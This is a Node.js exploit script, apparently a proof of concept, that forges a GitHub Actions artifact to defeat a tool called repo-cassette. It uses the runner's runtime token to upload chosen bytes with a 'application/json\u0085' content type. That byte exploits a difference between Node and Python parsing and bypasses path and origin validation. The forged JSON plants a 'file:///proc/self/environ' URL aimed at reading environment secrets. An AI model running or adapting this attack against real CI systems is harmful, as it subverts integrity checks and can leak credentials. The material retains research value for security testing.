// Forge an Actions artifact whose blob has a custom Content-Type and whose bytes we choose.
//
// Why: repo-cassette's fingerprint is sha256 of whatever api.github.com returns for
// `repos/<repository>`, and `fetchSample` joins every extra path segment, so
// repository="<owner>/<repo>/actions/artifacts/<id>/zip" makes the fingerprint the artifact bytes.
// Node skips all validation unless the content type trims to exactly "application/json", while the
// Python side strips U+0085 — so a blob served as "application/json\x85" is non-JSON for Node
// (path validation skipped) and JSON for Python (both replay and origin checks pass).
//
// The artifact bytes must contain the artifact's own id (full_name has to equal the repository
// string), so we upload a placeholder first, read the id back, then PUT the real bytes to the same
// signed URL with the custom content type.
//
// Everything uses node:https on purpose: undici/fetch rejects non-ASCII header values, the classic
// client allows \x80-\xff (which is exactly what we need for the 0x85 byte).

const https = require('node:https');
const { URL } = require('node:url');
const crypto = require('node:crypto');

const RESULTS = process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_RUNTIME_URL;
const RUNTIME = process.env.ACTIONS_RUNTIME_TOKEN;
console.log('[*] runner env present:', Object.keys(process.env)
  .filter((k) => k.startsWith('ACTIONS_'))
  .map((k) => `${k}(len=${String(process.env[k]).length})`).join(' ') || 'NONE');
if (!RUNTIME || !RESULTS) {
  throw new Error('ACTIONS_RUNTIME_TOKEN/ACTIONS_RESULTS_URL missing — run this as a JS action (uses: ./), not a run: step');
}
const GH_TOKEN = process.env.GH_TOKEN;
const REPO = process.env.REPO;                 // owner/repo
const NAME = process.env.ART_NAME || 'rc';
const CT = 'application/json\u0085';           // the whole point

function req(method, url, headers, body) {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const r = https.request({
      method,
      hostname: u.hostname,
      path: u.pathname + u.search,
      headers,
    }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({
        status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks),
      }));
    });
    r.on('error', reject);
    if (body) r.write(body);
    r.end();
  });
}

function backendIds() {
  const payload = JSON.parse(Buffer.from(RUNTIME.split('.')[1], 'base64url').toString('utf8'));
  const scope = (Array.isArray(payload.scp) ? payload.scp.join(' ') : String(payload.scp || ''))
    .split(' ').find((s) => s.startsWith('Actions.Results:'));
  if (!scope) throw new Error('no Actions.Results scope in runtime token');
  const [, run, job] = scope.split(':');
  return { workflow_run_backend_id: run, workflow_job_run_backend_id: job };
}

const twirp = (rpc, payload) => req(
  'POST', `${RESULTS.replace(/\/$/, '')}/twirp/github.actions.results.api.v1.ArtifactService/${rpc}`,
  { 'content-type': 'application/json', authorization: `Bearer ${RUNTIME}` },
  JSON.stringify(payload),
);

const api = (path) => req('GET', `https://api.github.com${path}`, {
  authorization: `Bearer ${GH_TOKEN}`,
  accept: 'application/vnd.github+json',
  'user-agent': 'forge',
});

async function putBlob(signedUrl, bytes, contentType) {
  const headers = {
    'x-ms-blob-type': 'BlockBlob',
    'x-ms-version': '2021-08-06',
    'content-length': String(bytes.length),
  };
  if (contentType) headers['x-ms-blob-content-type'] = contentType;
  return req('PUT', signedUrl, headers, bytes);
}

(async () => {
  const ids = backendIds();
  console.log('[*] backend ids', ids);

  const created = await twirp('CreateArtifact', { ...ids, name: NAME, version: 4 });
  const signed = (() => { try { return JSON.parse(created.body.toString('utf8')).signed_upload_url; }
    catch { return undefined; } })();
  console.log('[*] CreateArtifact', created.status, 'signed_upload_url?', !!signed,
    signed ? '' : created.body.toString('utf8').slice(0, 300));
  if (!signed) throw new Error('no signed_upload_url');

  const placeholder = Buffer.from('{}');
  const p1 = await putBlob(signed, placeholder, 'application/json');
  console.log('[*] PUT placeholder', p1.status, p1.body.toString('utf8').slice(0, 200));

  const fin = await twirp('FinalizeArtifact', {
    ...ids, name: NAME, size: String(placeholder.length),
    hash: { value: `sha256:${crypto.createHash('sha256').update(placeholder).digest('hex')}` },
  });
  console.log('[*] FinalizeArtifact', fin.status, fin.body.toString('utf8').slice(0, 300));

  // read the id back: the artifact bytes must contain it. Finalize is async on GitHub's side, so
  // the artifact can take a few seconds to show up in the REST listing.
  let mine;
  for (let i = 0; i < 12 && !mine; i += 1) {
    const list = await api(`/repos/${REPO}/actions/artifacts?per_page=100`);
    if (list.status !== 200) {
      console.log('[!] artifact listing', list.status, list.body.toString('utf8').slice(0, 200));
    } else {
      const artifacts = JSON.parse(list.body.toString('utf8')).artifacts || [];
      mine = artifacts.filter((a) => a.name === NAME).sort((a, b) => b.id - a.id)[0];
    }
    if (!mine) await new Promise((r) => setTimeout(r, 2500));
  }
  if (!mine) throw new Error('artifact never showed up in the REST listing');
  console.log('[*] artifact id', mine.id, 'expired', mine.expired);

  const repository = `${REPO.toLowerCase()}/actions/artifacts/${mine.id}/zip`;
  const payload = Buffer.from(JSON.stringify({
    full_name: repository,
    description: 'repo cassette',
    stargazers_count: 0,
    owner: { login: 'rc', avatar_url: 'file:///proc/self/environ' },
  }), 'utf8');

  const p2 = await putBlob(signed, payload, CT);
  console.log('[*] PUT real bytes with custom content-type:', p2.status,
    p2.body.toString('utf8').slice(0, 400));
  if (p2.status >= 300) {
    console.log('[!] Azure rejected the custom content type — trying plain application/json');
    const p3 = await putBlob(signed, payload, 'application/json');
    console.log('[*] PUT fallback', p3.status, p3.body.toString('utf8').slice(0, 200));
  }

  // verify what api.github.com actually serves (follow the redirect by hand)
  const dl = await req('GET', `https://api.github.com/repos/${REPO}/actions/artifacts/${mine.id}/zip`, {
    authorization: `Bearer ${GH_TOKEN}`, accept: 'application/vnd.github+json', 'user-agent': 'forge',
  });
  console.log('[*] download status', dl.status, 'location?', !!dl.headers.location);
  let final = dl;
  if (dl.headers.location) {
    final = await req('GET', dl.headers.location, { 'user-agent': 'forge' });
  }
  const ctHeader = final.headers['content-type'] || '';
  console.log('[*] final status', final.status);
  console.log('[*] final content-type       :', JSON.stringify(ctHeader));
  console.log('[*] final content-type (hex) :', Buffer.from(ctHeader, 'latin1').toString('hex'));
  console.log('[*] final body               :', final.body.toString('utf8').slice(0, 400));
  console.log('[*] final body sha256        :', crypto.createHash('sha256').update(final.body).digest('hex'));

  console.log('\n===== HAND THIS BACK =====');
  console.log('REPOSITORY=' + repository);
  console.log('ARTIFACT_ID=' + mine.id);
  console.log('BODY_B64=' + final.body.toString('base64'));
  console.log('CT_HEX=' + Buffer.from(ctHeader, 'latin1').toString('hex'));
  console.log('CT_HAS_0x85=' + (ctHeader.includes('\u0085') ? 'YES' : 'NO'));
})().catch((e) => { console.error('[x]', e); process.exit(1); });